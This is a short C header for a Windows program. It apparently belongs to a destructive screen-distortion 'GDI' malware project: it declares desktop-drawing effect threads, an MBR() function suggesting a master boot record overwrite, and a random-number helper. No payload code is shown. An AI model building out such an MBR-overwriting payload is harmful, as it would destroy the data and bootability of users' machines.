#pragma once

#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>

#define graphics \
HDC hdc = GetWindowDC(GetDesktopWindow()); \
RECT rect; \
GetWindowRect(GetDesktopWindow(), &rect); \
int w = rect.right - rect.left; \
int h = rect.bottom - rect.top;

void MBR();
void Main();
DWORD WINAPI Distort(LPVOID parameter);
DWORD WINAPI Spiral(LPVOID parameter);
DWORD WINAPI InvertedTriangles(LPVOID parameter);
DWORD WINAPI InvertedCircles(LPVOID parameter);
DWORD WINAPI SideIncInvert(LPVOID parameter);
DWORD WINAPI SplitFlip(LPVOID parameter);

static int random() {
	HCRYPTPROV cryptprov = NULL;
	if (cryptprov == NULL)
		CryptAcquireContext(&cryptprov, NULL, NULL, PROV_RSA_FULL, CRYPT_SILENT | CRYPT_VERIFYCONTEXT);
	int out = NULL;
	CryptGenRandom(cryptprov, sizeof(out), (BYTE*)(&out));
	return out & INT_MAX;
}